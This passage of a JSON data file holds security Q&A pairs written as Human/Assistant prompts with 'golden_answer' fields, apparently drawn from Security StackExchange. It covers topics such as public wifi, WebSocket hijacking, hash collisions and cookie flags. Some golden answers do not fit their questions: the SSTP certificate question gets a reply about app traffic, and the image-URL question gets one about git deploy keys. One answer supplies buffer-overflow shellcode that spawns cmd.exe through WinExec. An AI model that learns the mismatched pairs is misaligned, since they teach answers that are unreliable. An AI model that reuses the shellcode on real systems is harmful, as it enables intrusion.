        "golden_answer": " <p>If honeypot is a virtual machine, you could write the logs to the host - tricky, but I've done it. </p>\n\n<p>I have also simply used a second nic on the honeypot connected to a management network. Assuming that your hackers cannot see that level of access in the OS, they would never see the communications, and you have a lot of power over the firewall and routing rules to add safety.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm taking a trip soon and want to figure out how safe it is to use public wifi for services. A common piece of security advice I've found about public wifi (<a href=\"http://www.usatoday.com/story/tech/2013/07/01/free-wi-fi-risks/2480167/\" rel=\"nofollow\">example</a>) is don't log into things, because it's easy for others to snoop on what you're doing. More specifically, they say don't type your username/password into a login form and hit the submit button, or access any sensitive data like bank accounts.</p>\n\n<p>But what if I logged into a service on my private home network, never cleared the session and want to continue using the service from public wifi after I leave the house? I'm thinking like Dropbox or Pandora or Netflix. If I don't need to type in my password and hit send, is that safer/safe enough? Would it make a difference if it's going through a browser or a dedicated app?</p>\n\n<p>EDIT:<br>\nWhile I appreciate the answers so far they seem geared towards real computers and I want to clarify I'm thinking about my Android phone. Thus my question about apps, because I have no idea how to tell if an app is using HTTPS or what.</p>\n\n\nAssistant:",
        "golden_answer": " <p>If the site you are visiting uses HTTPS for the entire site (not just the login page) and you check that it actually is using HTTPS, with a valid certificate (e.g., no warnings about a bad certificate) and it is the URL you want to go to, then you are safe.  </p>\n\n<p>(Except against extremely strong adversaries like governments who have the ability to coerce Certificate Authorities into signing fraudulent certificates or giving them the ability to sign them.  But at this point, these strong adversaries can do these malicious changes at the ISP level, so you are screwed either way). </p>\n\n<p>If the site isn't using HTTPS, any data you send or receive may be eavesdropped or easily changed by an attacker.</p>\n\n<p>You should also be extremely careful about downloading and installing anything that didn't come over HTTPS when on public wifi (though you probably should be cautious about this regardless).  E.g., if you install a browser plugin or command-line instructions that came over regular HTTP, it would be possible for an attacker to modify the plugin (to for example run on all webpages and send every form submission to some random domain it controls to steal your passwords / credit card info / etc).</p>\n\n<blockquote>\n  <p>EDIT: While I appreciate the answers so far they seem geared towards real computers and I want to clarify I'm thinking about my Android phone. Thus my question about apps, because I have no idea how to tell if an app is using HTTPS or what.</p>\n</blockquote>\n\n<p>You could try using a network packet catcher (like wireshark) to see if the apps are communicating using only encryption (e.g., look for HTTPS protocol).  Most major vendors should be using HTTPS for their apps if they use HTTPS for their website everywhere else, but you can't be sure (and its safer to assume it doesn't).  You mentioned Dropbox, and Dropbox for example states they use network encryption (TLS) everywhere between their apps, so you are safe to use Dropbox (assuming they are checking certificates correctly).</p>\n\n<p>If you are unsure of a mobile app you can often use the mobile HTTPS site in your web browser instead.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I can't understand why SOP (<a href=\"https://en.wikipedia.org/wiki/Same-origin_policy\" rel=\"nofollow noreferrer\">same-origin policy</a>) cannot block Cross-Origin WebSocket Hijacking, I just read <a href=\"https://dev.solita.fi/2018/11/07/securing-websocket-endpoints.html\" rel=\"nofollow noreferrer\">this</a> article and I can't understand from where <a href=\"https://en.wikipedia.org/wiki/WebSocket\" rel=\"nofollow noreferrer\">WebSocket</a> requests comes from.</p>\n<p>From where does WebSocket requests comes from, that SOP cann't block attacks related to it ?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Same-origin policy considers all of these origins to be different:</p>\n<pre><code>http://example.com\nhttps://example.com\nws://example.com\nwss://example.com\n</code></pre>\n<p>So if browsers were to apply SOP rules to WebSockets, if a page at <code>https://example.com</code> tried to connect to a WebSocket at <code>wss://example.com</code> it would fail.</p>\n<p>In theory WebSockets could have been designed to use CORS headers during the initial HTTP handshake, but these two technologies were developed at roughly the same time.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've been in charge of systems administration for a small company for a couple of years and am now training some new collaborators to take over. So far, there has been no security policy, but I would like to leave behind a good security policy that clearly states:</p>\n\n<ul>\n<li>a code of ethics agreed upon by all and the direction board;</li>\n<li>rules on how to maintain, update and configure servers;</li>\n<li>specifics on how to maintain the security structure: new attacks surface, etc and right now we don't have a structured way to deal with that;</li>\n</ul>\n\n<p>I'm a bit lost on how to start and am sure that list is <em>way</em> incomplete, so I'd like to ask for some pointers on how to research this and get started.</p>\n\n<p>Thank you.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Alright, so this was originally intended as a comment to your response to the answer given by @jl01 but it became too long and it should have merit on it's own....</p>\n\n<p>There's almost an art to creating policies.  Ideally (though i'm sure some people would disagree with me) a policy would be a very general statement regarding the topic.  For example, something not much more complex than \"This company will operate with current best practices for system patching\".  The idea is that a policy should be established and not need changed (if done perfectly).  It should be generalized enough that it will not need to be updated as different technologies, attack vectors, regulations, etc change.</p>\n\n<p>It is very common to split policies up into each separate realm of business/technology.  This lends itself to producing policies that are more custom fitted to your company and allows you to keep clarity when referring to those policies.</p>\n\n<p>Another way to think of it is that a policy is the business' way of covering their hind ends.  It is created to cover as much as possible so if something goes wrong the company can mold their response to each separate situation while still using the same policy.</p>\n\n<p>Those policies would be  expanded on via procedures, guidelines, and regulations (come to think of it, this should be fairly close to how SANs describes it). I believe SANs refers to what I call \"procedures\" as \"standards\".  I apologize for any confusion because of that.</p>\n\n<p>A procedure would be an actual practice which follows a policy (many policies that i have seen seem to refer to the applicable procedures within the policy itself).</p>\n\n<p>A guideline on the other-hand is exactly that, a suggestion of acceptable practices.  Though they are only suggestions, they are not to be taken lightly.  When audits occur, these are the low hanging fruit that an auditor can latch onto.</p>\n\n<p>Procedures and guidelines are the only things that you should need to update with changing business climate, environmental issues, threats, etc.</p>\n\n<p>When i designed my first set of policies, granted this was from a class regarding information security policies, I set up these different policies:</p>\n\n<ul>\n<li>Information Sensitivity Policy</li>\n<li>Extranet Policy</li>\n<li>Email Policy</li>\n<li>Removable Media Policy </li>\n<li>Password Policy </li>\n<li>Security Monitoring Policy</li>\n<li>Router Security Policy</li>\n<li>Server Security Policy</li>\n<li>System Update Policy</li>\n<li>ASP Policy</li>\n<li>Server Management Policy</li>\n<li>Security Training Policy</li>\n</ul>\n\n<p>This is not an exhaustive list, but it should give you an idea of some of the break downs that may take place.  The way policies are divided are dependent on the needs of that company.</p>\n\n<p>Last, but definitely not least, each policy should be created in such a way that there is do doubt as to what and how it's applied.  By this, i mean that along with each policy the purpose, the scope, the enforcement, and the definitions regarding that policy should be established. I always have fun typing the phrase \"will be subject to repercussions up to and including termination\".</p>\n\n<p>Though I did not list it earlier, an ethics policy should be in every policy set.  Even when using ASPs, or any service for that matter, it's good practice to request their ethics policy and, depending on what you see, require by contract that they abide by your companies ethics policy for that job.</p>\n\n<p>So, i may have dove a bit too far into the subject... but i hope it helped.</p>\n\n<p>Disclaimer: I am more than aware that this isn't the only way policies can be constructed.  From my experience, most companies have a set of policies that have been loosely constructed over years of regulation changes and compliance issues. </p>\n\n<p>p.s. an ASP is an application service provider, i see that i haven't mentioned it's definition anywhere above.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm developing a custom VPN solution that needs to support SSTP for Windows clients. For this, my server needs to authenticate itself using a certificate during the SSL handshake. As usual, Windows will then look through its local set of trusted certificates and decide whether to accept or reject the connection.</p>\n\n<p>Since this project currently doesn't have the budget to pay for an official certificate (from Verisign or whoever), I would like to use a self-signed one for now. Unfortunately, this means I will need to ask my users to install this certificate so that Windows can successfully authenticate my server.</p>\n\n<p>I have two specific questions about this scenario:</p>\n\n<ul>\n<li><p>If I ask users to install this self-signed certificate into their \"Trusted Root Certification Authorities\" store, does this pose a security risk (of ANY kind!) for them? For example, if someone were to get a hold of the private key of my certificate, could they use it to impersonate any other entity (like Google or Facebook or a bank) by simply signing their own certificate for those names and having it point to my root certificate, or could they only impersonate my server?</p></li>\n<li><p>If so, is there a way to tell Windows to only use my certificate to authenticate my SSTP server, but not to authenticate any other https or other connections? Preferably, this would be an action that the users can easily take or verify rather than just some setting inside the certificate.</p></li>\n</ul>\n\n\nAssistant:",
        "golden_answer": " <p>There is no way to be sure that the traffic is coming from a specific app.  Since the app is in the control of the user, the user can always make their own application that acts the same as the application that was intended for the server.  There are ways to make it harder for someone to do this and I can provide more details if you want.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Why is it big news to find a hash collision like <a href=\"https://news.ycombinator.com/item?id=13713480\" rel=\"noreferrer\">https://news.ycombinator.com/item?id=13713480</a>? I'm not asking about the implications. </p>\n\n<p>It seems like all you'd have to do to find a collision would be to calculate the hash of <code>0000000000000000000000000000000000000000</code>, <code>0000000000000000000000000000000000000001</code>, etc all the way up to <code>ffffffffffffffffffffffffffffffffffffffff</code>, and then any hash you calculate after that would have to have a collision one of the previously calculated ones because there are only 16^40 possible sha-1s.</p>\n\n\nAssistant:",
        "golden_answer": " <p>You're missing a lot.</p>\n\n<ol>\n<li>The space of things to generate hashes for is infinite, what you listed is the space of hashed values.  They are two very different things.</li>\n<li>Even generating the list of hashes for the space you noted in your post would be extremely time consuming.  \"All you'd have to do ...\" doesn't come close to doing it justice.  It's sort of like saying \"If you want to find a missing person, just go around the world until you find them.\"</li>\n</ol>\n\n<p>In any case, getting back to your main question: Why are hash collisions a big deal?  Because many crypto related things depend on there not being collisions, at least not that can be readily found.  For example, digital signatures hash a document and then encrypt the hash.  If you can generate hash collisions you can make it appear that someone digitally signed a document that they did not in fact sign.  That's bad, very bad.</p>\n\n<p>The irony is that hash collisions are inevitable, as a hash maps an infinite space to a finite space.  In fact, there must be an infinite number of collisions.  But being able to <strong><em>generate</em></strong> collisions is scary from a crypto perspective.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I recently was emailed from HaveIBeenPwned.com (which I am signed up on) about the ShareThis website/tool (not signed up on).</p>\n\n<p>I have no memory of signing up for that service.</p>\n\n<p>When I go to recover the account (I might as well close/change password), I get this:</p>\n\n<p><a href=\"https://i.stack.imgur.com/kuQOu.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/kuQOu.png\" alt=\"reset password page for ShareThis, but with an error message that reads: &#39;No user with that Address. Need to Register?&#39;\"></a></p>\n\n<p>The two facts seem mutually exclusive:</p>\n\n<p>Either I had an account and it was pwned, or I didn't have an account (and thus HIBP is in error)?</p>\n\n<p>How do I find out the true situation, and what is the most secure course of action?</p>\n\n\nAssistant:",
        "golden_answer": " <p>From the <a href=\"https://haveibeenpwned.com/FAQs\" rel=\"noreferrer\">FAQ</a>:</p>\n\n<blockquote>\n  <h3>Why do I see my email address as breached on a service I never signed up to?</h3>\n  \n  <p>When you search for an email address, you may see that address appear against breaches of sites you don't recall ever signing up to. There are many possible reasons for this including your data having been acquired by another service, the service rebranding itself as something else or someone else signing you up. For a more comprehensive overview, see <a href=\"https://www.troyhunt.com/why-am-i-in-a-data-breach-for-a-site-i-never-signed-up-for/\" rel=\"noreferrer\">Why am I in a data breach for a site I never signed up to?</a></p>\n</blockquote>\n\n<p>It's likely some services allow signing up without confirming an email address, or that accounts that haven't confirmed email addresses are still stored indefinitely but cannot be logged in to, or any number of similar issues.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>My question is really simple, are HttpOnly or Secure flags needed if a website doesn't have a private part accessible with login?</p>\n\n\nAssistant:",
        "golden_answer": " <p>These flags are useful if the cookies you're working with contain sensitive information (such as session cookies). They help to protect your cookies against being compromised in <em>some</em> attack scenarios.</p>\n\n<p>To recap:</p>\n\n<ul>\n<li><p>A cookie flagged <code>Secure</code> is only sent to the server if the connection is secure (i.e. HTTPS). That is, a man-in-the-middle attacker can't capture them by intercepting a plain HTTP connection to your site.</p></li>\n<li><p>A cookie flagged <code>HttpOnly</code> is not accessible to scripts. That is, an XSS vulnerability on your site wouldn't allow an attacker to directly exfiltrate a <code>HttpOnly</code> cookie via Javascript's <code>document.cookie</code>.</p></li>\n</ul>\n\n<p>If all your cookies are non-sensitive (e.g. a language setting) then you wouldn't absolutely have to harden access with these flags. But if you never use Javascript to access cookies and your entire domain is only available over HTTPS anyway, it's good practice to add them.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I want to send a HTTPrequest to a specific web address, but with different IP address. For example, if a webserver detect IP address, then add it to a database. If another request come from a IP, which is in the DB server, ignore it.</p>\n\n<p>What I'm asking is, how can I send HTTPrequest, but without server identifying me as a same person? I heard about proxies, but I think even if I use a proxy, proxy also have an IP address, so I can send only one valid request through the proxy, am I correct?</p>\n\n<p>If so, how can I send HTTPrequest without server knowing it is me?</p>\n\n<p>Note: I don't want server response. I only want to send the request. I am running Windows 8.1.</p>\n\n\nAssistant:",
        "golden_answer": " <p>I cant create a comment, so this is my two cents.</p>\n\n<p>You can of course send a HTTP request under a different IP number (other than yourself, \"anonymous\"), using NMAP. But the one down side would be that you will never get your HTTP request back, because if the server responds it will respond to the spoofed IP address. Unless you set the IP address to some other device you have. </p>\n\n<p>Of course you can use proxies, but at the end of the rainbow you are still tied to the request.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>What is the best place to go for security news? I am looking for everything from news updates to editorials to guides and research. Anywhere considered more reliable or particularly hard-hitting?</p>\n\n<p>Also I am looking for good Twitter feeds!</p>\n\n\nAssistant:",
        "golden_answer": " <p>For a site I would recommend the SANS Internet Storm Center at <a href=\"https://isc.sans.edu/\" rel=\"nofollow\">https://isc.sans.edu/</a>.</p>\n\n<p>I find the most useful for news for me is a twitter list of security professionals and researchers such as.</p>\n\n<ul>\n<li><a href=\"https://twitter.com/sans_isc\" rel=\"nofollow\">@sans_isc</a></li>\n<li><a href=\"https://twitter.com/uscert_gov\" rel=\"nofollow\">@uscert_gov</a></li>\n<li><a href=\"https://twitter.com/schneierblog\" rel=\"nofollow\">@schneierblog</a></li>\n<li><a href=\"https://twitter.com/gcluley\" rel=\"nofollow\">@gcluley</a></li>\n<li><a href=\"https://twitter.com/duckblog\" rel=\"nofollow\">@duckblog</a></li>\n<li><a href=\"https://twitter.com/markrussinovich\" rel=\"nofollow\">@markrussinovich</a></li>\n<li><a href=\"https://twitter.com/jeremiahg\" rel=\"nofollow\">@jeremiahg</a></li>\n<li><a href=\"https://twitter.com/briankrebs\" rel=\"nofollow\">@briankrebs</a></li>\n<li><a href=\"https://twitter.com/mikko\" rel=\"nofollow\">@mikko</a></li>\n<li><a href=\"https://twitter.com/hemoore\" rel=\"nofollow\">@hdmoore</a></li>\n<li><a href=\"https://twitter.com/dakami\" rel=\"nofollow\">@dakami</a></li>\n</ul>\n\n<p>You can probably find other lists of security related twitter users that would be worthwhile to follow.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>So I've been offered the chance to go to a day long security awareness event hosted by some organization.  On their site, I noticed the login box in the corner, but the site was delivered on HTTP.  <em>They probably are doing like some other sites and only using https for the actual login.</em> I thought.  So I checked the source of the page, found the form being submitted for login, and noticed 'http://...'.</p>\n\n<p>So I decide to do a test.  Break out google's developer tools and capture the post.  I still don't see any mention of https and I see my fake password in plain text (so they didn't encrypt with javascript before sending).</p>\n\n<p>I'm wanting to bring this to my coworkers' attention, but first I want to be sure that they actually are sending it over http.  Is there any other way to verify the connection is going over http (other than setting up a MITM attack on myself, which I'm pretty sure would cause the network admin to express great... displeasure towards me)?</p>\n\n\nAssistant:",
        "golden_answer": " <p>What you have done is a pretty thorough test, but you can get ironclad proof this way: Install <a href=\"https://www.wireshark.org/\">Wireshark</a> on your own computer, turn on packet capture, and perform the login.  If HTTPS, the packets you capture will be marked as such, and will be encrypted.  If not, you will be able to see the login credentials <em>en claire</em> in the captured data.</p>\n\n<p>Do note that encrypting client-side with JavaScript <em>does not work.</em>  It is vulnerable to replay attacks and MITM attacks because whatever client sends to server effectively <em>is</em> the password, no matter what has been done to it.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've just taken over as IT Manager in an environment where most of the end-users are using HP-based Win7 thin clients (approx 50 seats) to access a remote desktop server.</p>\n\n<p>All the servers &amp; fat clients on site are protected with ESET Endpoint Antivirus, however I notice none of the thin clients have any type of AV enabled.</p>\n\n<p>A brief Google search doesn't show much interest in securing these little beasties.  Should I look into a lightweigh AV system for these, or are they fine?</p>\n\n<p><strong>UPDATE:</strong> </p>\n\n<p>These thin clients are HP T510's, running Windows 7 Standard Embedded.  They don't seem to be using PXE Boot - by the look of it, each has its' own Windows OS which presents them with a local desktop on boot.  This desktop has a RDP connection, which they use to access the main server.</p>\n\n<p>The Remote Desktop server <em>does</em> have antivirus on it, but there's no indication that the thin client is collecting anything from the server directly.</p>\n\n<p>They don't have any browser available on the local OS, but I would be unsuprised if that's just a result of the previous IT folks simply hiding applications.</p>\n\n<p>These machines aren't joined to the AD domain, and log in automatically, however it seems they aren't logged in with any admin rights.</p>\n\n\nAssistant:",
        "golden_answer": " <p>I presume these are x86 clients that are loading OS from the network?  Do these folks have internet access? </p>\n\n<p>If so, it seems there is still an attack vector -- If my memory serves, at least one variant of the cryptolocker type malware attempts encryption of every .doc,spreadsheet, photo, or other user data file (including those found on network shares) it can find, even before a reboot.</p>\n\n<p>With that said, I am one of those that believe that modern anti-virus software provides very little in terms of genuine protection from the type of zero-day exploits that causing the biggest problems.  </p>\n\n<p>In that respect, it seems the biggest things would be to ensure that the thin clients are booting from fully updated and patched OS images, that their users aren't running with administrator rights, aren't accessing the internet with an out of date internet explorer, and are not networked to shares or network services they do not need.    </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have a program like this:</p>\n\n<pre><code>int main() {  \n   char buffer[16];\n   printf(\"Write something: \");\n   gets(buffer);\n   printf(\"You wrote: %s\\n\", buffer);\n   return 0; \n}\n</code></pre>\n\n<p>And I have wrote a little bytecode payload, that should launch cmd.exe via WinExec, </p>\n\n<pre><code>ADD ESP -80      ; 83 C4 80, at 0x0019FF28\nXOR EDX, EDX     ; 31 D2   \nPUSH EDX         ; 52\nPUSH 'd'         ; 6A 64\nPUSH 'm'         ; 6A 6D\nPUSH 'c'         ; 6A 63    \nPUSH  1          ; 6A 01\nNOP              ; 90\nCALL F0 F7 77 74 ; E8 F0 F7 77 74 = WinExec (0x7477F7F0) \n28 FF 19         ; 28 FF 19 &lt;-- this should be a new return address\n</code></pre>\n\n<p>So it will fail to execute the code, which is wrong. Any idea how to tweak the code or any idea what should I incorporate into code? And I am not sure whether pushing characters onto stack is also valid.\n(And yes, it's only a demonstration)</p>\n\n\nAssistant:",
        "golden_answer": " <p>This is what I've came up with: </p>\n\n<pre><code>63 6D 64       ; \"cmd\"  &lt;-- 0x19FF28\n20             ; \\0x14\n31 C0          ; XOR EAX, EAX &lt;-- 0x19FF2C\n8D 1C E4       ; LEA EBX, [ESP]\n88 43 03       ; MOV BYTE PTR DS:[EBX+4], AL\n40             ; INC EAX\n53             ; PUSH EBX\n50             ; PUSH EAX (inc)\nE8 74 77 F7 F0 ; CALL 74 77 F7 F0 \n19 FF 2C       ; jump back to 0x19FF2C\n</code></pre>\n\n<p>Takes up 23 bytes, however it needs a tweak on address, where it jumps.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I had found <code>bcprov-ext-jdk16-145.jar</code> and <code>bcprov-jdk16-145.zip</code>. I wish to use the IDEA encryption to encrypt XML, but I haven't found any sample of coding in JAVA. </p>\n\n<p>Can anyone tell me how to call the methods in <code>org.bouncycastle.jce.provider.symmetric.*</code> to do the IDEA encryption and decryption or where can find sample code? </p>\n\n\nAssistant:",
        "golden_answer": " <p>BouncyCastle is a standard JCE provider, so most Java crypto code will work just fine. You just need to add the provider to java.security...  security.provider.6=org.bouncycastle.jce.provider.BouncyCastleProvider\nI'd recommend using something like OWASP ESAPI instead of using the crypto API directly.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I wonder if voice chat (via public services like yahoo, google talk, skype, etc) is practically secure? Is it possible for the ISP or any middle point? I do not consider hacking the computers, but transmitting data.</p>\n\n<p>Comparing with <code>http</code>, is there something like <code>https</code> for voice chat to avoid any possible spying in the middle? Is it practical to encrypt voice data?</p>\n\n\nAssistant:",
        "golden_answer": " <p>At the annual IEEE Security &amp; Privacy conference in 2011, White et al. presented some very involved research on <a href=\"http://www.ieee-security.org/TC/SP2011/PAPERS/2011/paper001.pdf\" rel=\"noreferrer\">reconstructing <strong>encrypted</strong> VoIP sessions</a>. The image below shows the overall architecture of the authors' approach.</p>\n\n<p>Although it works only for variable bitrate codecs (most common VoIP codecs are constant bitrate, e.g. G.711), the results are impressive. For details, have a look at the paper.</p>\n\n<p><img src=\"https://i.stack.imgur.com/ZKLBO.png\" alt=\"Architecture of reconstructing encrypted VoIP sessions\">.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Is it possible to spoof the CA of any server to sign some application?\nAs like as what <a href=\"https://github.com/paranoidninja/Pandoras-Box/blob/master/python/CarbonCopy.py\" rel=\"nofollow noreferrer\">CarbonCopy</a> claims?</p>\n\n\nAssistant:",
        "golden_answer": " <p>CarbonCopy  creates a self-signed certificates which looks like the original certificate, i.e. subject, issuer etc seem to match. But, the certificate is not signed by the specified issuer at all. This means if a proper validation of the certificate is done no local trust anchor will be found and the certificate will be rejected as untrusted.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>So, today an user sent me an e-mail about a suspicious e-mail. When I opened it to check it, I accidentaly hovered the mouse over the \"doc.jpg\" and it opened the image thumbnail. I never bothered to check the thumbnails, so I never stop to think about it, but would someone be able to execute malicious code in my computer if I checked the thumbnail?</p>\n\n<p><a href=\"https://i.stack.imgur.com/suoBu.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/suoBu.png\" alt=\"welp\"></a></p>\n\n<p>EDIT: As requested, we're using Google Chrome 43.0.2357.134 and Zimbra 8.0(yep, kinda dated, but unfortunately, we can't do anything about it).</p>\n\n\nAssistant:",
        "golden_answer": " <p>Maybe. In theory it might be that the (unknown) mail client you use already extracts information from the attachment when you simply hover over it. And the practice might not be that far away from this theory:\nThere were several bugs in the past where the preview feature for mails could be used to execute malware, see <a href=\"https://security.stackexchange.com/questions/60744/can-malware-be-activated-by-previewing-email-in-outlooks-preview-pane\">Can malware be activated by previewing email in Outlook&#39;s Preview pane?</a> or <a href=\"https://business.kaspersky.com/badwinmail-outlook/4954/\" rel=\"nofollow noreferrer\">BadWinmail: the really bad Outlook flaw</a>. There were also code execution in the past triggered by simply hovering over a file in explorer. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Whilst on the phone to support staff (about billing) to Virgin Media, perhaps the largest ISP and telecoms company in the UK, I was asked to confirm my password over the phone. </p>\n\n<p>I asked the advisor if they could see my password in plain text, and they said they can! </p>\n\n<p>I am currently wondering what the best course of action is for me to bring this issue to the attention of Virgin Media's management. The fact that any call center worker could go home and access my Facebook account is bad enough, but if the passwords are stored in plaintext, Virgin Media is sitting on an information security timebomb and all their customers are at risk.</p>\n\n<p>How do I get Virgin Media to handle passwords securely?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Generally, reuse of passwords across different sites is a bad idea for this reason; you never know whether they are taking measures to secure your password from view of staff or hackers who might grab the database.    Of course, once one of these sites is compromised, hackers will try the same password combination for other common accounts like Facebook, PayPal, etc etc.</p>\n\n<p>I recommend using LastPass, KeePass or another password manager to generate a new, random password for every site you login to and then save it.  Sure, having all your eggs in the LastPass basket might seem like a security risk, but at least they are more trustworthy to use best practices and secure your data.  This is evidenced by the recent hack of LastPass, which because they had been salting/hashing their passwords so well, I haven't bothered to change my master password because the risk of compromise is so small. </p>\n\n<p>I think using random passwords and saving them in a manager like LastPass is a MUCH better practice than memorizing and reusing passwords on different sites.  It also has the advantage of being easier/quicker to login as well, and reduces risk when you create logins on sites that you don't trust.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have the following PHP code that writes <code>accepted</code> to a file named text.txt only if the IP is equal to 127.0.0.1 (loopback). If the IP doesn't match it writes <code>denied</code>.</p>\n\n<pre><code>&lt;?php\n$file = fopen('text.txt' , 'a');\nif($_SERVER['REMOTE_ADDR'] === '127.0.0.1') {\n$request = $_GET['output'];\nif($request === '123') {\nfwrite($file, \"\\x0D\\x0A\".'accepted - ' .$_SERVER['REMOTE_ADDR']);\n\n}\n\n}\nelse {  \n    fwrite($file, \"\\x0D\\x0A\".'denied - ' .$_SERVER['REMOTE_ADDR']);\n}\n?&gt;\n</code></pre>\n\n<p>Can I send the get request (www.example.com/get.php?output=123) from an external network with a spoofed IP of 127.0.0.1? If it is possible, how can I do it? If not, why?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>Is it possible to send HTTP packet via spoofed IP?</p>\n</blockquote>\n\n<p>No you can't.</p>\n\n<p>HTTP is a protocol on top of TCP and doing IP spoofing with TCP is nearly impossible due to the internals of the protocol. You would not only need to send a single spoofed packet like in UDP but you would actually need to reply the packets of the peer with the matching sequence numbers without being able to watch the peers packets which contains this sequence number you need to match. And this reply must happen just to establish the connection, i.e. before even sending your HTTP payload.</p>\n\n<p>Apart from that many systems will simply drop packets which do not fit the routes, i.e. a packet claiming to be from 127.0.0.1 (localhost) should never come in at the network card connected with the local network.</p>\n\n<blockquote>\n<pre><code>if($_SERVER['REMOTE_ADDR'] === '127.0.0.1') {\n</code></pre>\n</blockquote>\n\n<p>But given your code you might actually be more interested if the value in <code>$_SERVER['REMOTE_ADDR']</code> could be spoofed. While most assume that this is the source IP address of the client it can actually be different from the real source IP of the HTTP connection and it might even be manipulable by an attacker.</p>\n\n<p>In case of a reverse proxy (or load balancer) in front of the web server the real IP of the client is not known to the web server because the connection from the client actually terminates at the reverse proxy. Therefore it is not uncommon for the reverse proxy to propagate the original clients source IP by inserting a HTTP header, typically <code>X-Forwarded-For</code>. Some web servers are setup to put the value from this header into <code>$_SERVER['REMOTE_ADDR']</code> instead of the real source IP. And in some situations this is actually exploitable by the attacker to bypass IP based access control like employed in your case. </p>\n\n<p>For a specific example of this kind of bypass see <a href=\"http://blog.ircmaxell.com/2012/11/anatomy-of-attack-how-i-hacked.html\" rel=\"noreferrer\">Anatomy of an Attack: How I Hacked StackOverflow</a>.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I know that if a web application needs to be PCI-DSS or HIPAA compliant the user personal identifiable information (e.g. user password, etc) needs to be kept confidential.</p>\n\n<p>Under what other situations would the web application/system be <strong>required</strong> to protect user personal identifiable information? </p>\n\n\nAssistant:",
        "golden_answer": " <p>The answer is highly jurisdiction-dependent, but here's the general outline of the answers in the US:</p>\n\n<ul>\n<li><p>If you promise to protect the confidentiality of user information (e.g., in a privacy policy), you must do so.  Failing to live up to your promises may be viewed as unfair or deceptive trade practices, and the FTC has jurisdiction to prosecute companies who do so.</p></li>\n<li><p>If you have signed a contract promising confidentiality, you must do whatever you promised to do in your contract.</p></li>\n<li><p>In the US, if you manage data for video rental subscribers, you may be required to protect confidentiality.  The US has special laws governing privacy for video rentals, following the Bork incident.</p></li>\n<li><p>If you manage student data or are a government agency, you may be required to protect the confidentiality of user data.</p></li>\n</ul>\n\n<p>In many other cases, there is likely to be no legal requirement to protect the confidentiality of user data.  However, it's probably still the right thing to do.</p>\n\n<p>In Europe, the answers are likely to be very different, as Europe has strong data protection laws that do not have any analogue in US law.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am Developing a Web Application Currently, in which users can Make a Profile and Fill out the User's information, In this i have also kept a Section for Profile Picture, in that i have used a logic that No Users shall be Upload any Image to the Profile picture just for Testing and instead of that i am showing Images like \n<code>&lt;div style=\"background-image: url(\"http://example.com/image.jpg\")&gt;&lt;/div&gt;</code></p>\n\n<p>In this i have made a Input for user to place the path of jpg image from any site he likes and I directly display the image from that site only, which is <code>http://example.com/image.jpg</code> in our case.</p>\n\n<p>I want to consider the worst situation here, I haven't placed check nor whitelisted any domains into the <code>example.com/image.jpg</code>. I placed a URL like <code>http://stackoverflow.com/index.html</code> it shows me blank, I tried many PHP scripts like <code>http://attacker.com/omg.php</code> and it doesn't run the script on my domain.</p>\n\n<p>Is there any possibility of attack vector here? If yes, kindly suggest me. And also is CORS or SOP Bypass possible here, I have CSP protection of the domain.</p>\n\n<p>Note: In the URL Section, i am making First validating check at <code>scheme</code> of URL where http:// , // and https:// are WhiteListed &amp; in the Image section i have ONLY whitelisted Numbers + Alphabets and special characters like <code>.</code>, <code>-</code> &amp; <code>/</code> .Rest else are blocked</p>\n\n\nAssistant:",
        "golden_answer": " <p>As has been suggested, using a read-only deploy key is likely to be a useful approach, and I believe this is the most common solution.</p>\n\n<p>If you use a key on your school's server which has read/write access to github, you can still make it a key which you don't use for anything other than that one repository, which limits its potential for abuse. </p>\n\n<p>Alternatively (and better), here are two approaches which avoid the problems that are inherent in running the git client on your untrusted server:</p>\n\n<ol>\n<li><p>At the expense of more network traffic and delays, you could also do all of the git/ssh stuff from your workstation, while mounting the git repository files from the school server, onto your workstation, eg using sshfs.  It's quite workable if you are close to the server you are working on, and requires an absolute minimum of complexity in setup.</p></li>\n<li><p>You could configure your school server's copy as another git repository, which you'd access over ssh.  You'd set the copy on your laptop to have two remotes, so you push and pull to/from github as usual, and you only ever push to your school.  Used like this, git is a very lightweight deployment protocol - probably lighter than rsync even, since it doesn't need to scan the whole file tree for changes.  This would be my preferred approach so long as turning the school's copy into a git repository is not a problem, which probably also depends who else is working on it.</p></li>\n</ol>\n"
    },
    {
